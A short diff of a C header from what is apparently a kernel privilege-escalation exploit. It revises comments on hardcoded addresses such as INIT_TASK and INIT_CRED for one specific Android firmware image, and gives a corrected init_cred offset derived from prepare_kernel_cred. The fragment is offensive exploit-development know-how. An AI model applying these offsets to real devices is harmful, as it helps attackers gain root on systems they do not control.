@@ -16,9 +16,18 @@
 #define P0_KERNEL_PHYS_LOAD 0x40000000ULL
 #define PSELECT_WAITER_WORD_SHIFT 2
 
-/* kernel image addresses (from /proc/kallsyms and binary analysis) */
-#define INIT_TASK          0xffffff939d8dc058ULL   /* Based on swapper/0 string location */
-#define INIT_CRED          0xffffff939dae3850ULL   /* prepare_kernel_cred loads from this pointer (BSS) */
+/* kernel image addresses (from /proc/kallsyms and binary analysis)
+ * 2026-08-16 audit vs ares_images_V14.0.4.0.TKJCNXM boot.img kernel:
+ *  - INIT_TASK below was a swapper-string guess (swapper-0x600); the image's
+ *    .data at that offset is all zeros and the real init_task is not present
+ *    in the Image file. The exploit resolves init_task at runtime from
+ *    /proc/kallsyms (EXPORT_SYMBOL) in util.c resolve_missing_offsets();
+ *    this value is only the degraded fallback.
+ *  - INIT_CRED below was wrong: init_cred is at base + 0x1c69158 (verified
+ *    via prepare_kernel_cred@0x64604 ADRP: get_cred + memcpy(new, 0xa8)).
+ */
+#define INIT_TASK          0xffffff939d8dc058ULL   /* fallback only - see note */
+#define INIT_CRED          0xffffff939dae3850ULL   /* obsolete - see note */
 #define ENTRY_TASK         0xffffff939d404028ULL   /* __switch_to reference (per-CPU) */
 #define PER_CPU_OFFSET     0xffffff939d404028ULL   /* per_cpu area base */
 #define ROOT_TASK_GROUP    0xffffff939d8ce1f0ULL   /* fork_init reference */
